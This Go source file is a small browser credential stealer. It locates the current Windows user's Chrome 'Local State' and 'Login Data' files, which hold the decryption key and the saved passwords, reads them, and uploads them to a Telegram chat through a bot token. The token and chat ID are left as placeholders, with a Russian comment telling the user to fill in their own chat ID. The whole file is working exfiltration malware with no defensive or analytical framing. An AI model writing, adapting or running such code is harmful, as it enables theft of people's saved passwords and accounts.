package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/user"
	"strings"

	"github.com/go-telegram-bot-api/telegram-bot-api"
)

func main() {
	bot, err := tgbotapi.NewBotAPI("TOKEN")
	if err != nil {
		log.Fatal(err)
	}

	chatID := int64(CHATID) // Замените на ваш chatID

	currentUser, err := user.Current()
	if err != nil {
		log.Fatal(err)
	}

	username := getUsername(currentUser.Username)
	fmt.Println(username)

	pathToLocalState := fmt.Sprintf("C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", username)
	pathToLoginData := fmt.Sprintf("C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", username)

	sendFileToTelegram(bot, chatID, pathToLocalState)
	sendFileToTelegram(bot, chatID, pathToLoginData)
}

func getUsername(fullUsername string) string {
	split := strings.Split(fullUsername, "\\")
	if len(split) > 1 {
		return split[1]
	}
	return fullUsername
}

func sendFileToTelegram(bot *tgbotapi.BotAPI, chatID int64, filepath string) {
	fmt.Println(filepath)

	file, err := os.Open(filepath)
	if err != nil {
		log.Println("Failed to open the file:", err)
		return
	}
	defer file.Close()

	fileContents, err := ioutil.ReadAll(file)
	if err != nil {
		log.Println("Failed to read the file:", err)
		return
	}

	fileBytes := tgbotapi.FileBytes{
		Name:  filepath,
		Bytes: fileContents,
	}

	msg := tgbotapi.NewDocumentUpload(chatID, fileBytes)
	_, err = bot.Send(msg)
	if err != nil {
		log.Println("Failed to send file to Telegram:", err)
		return
	}

	log.Println("File sent successfully!")
}
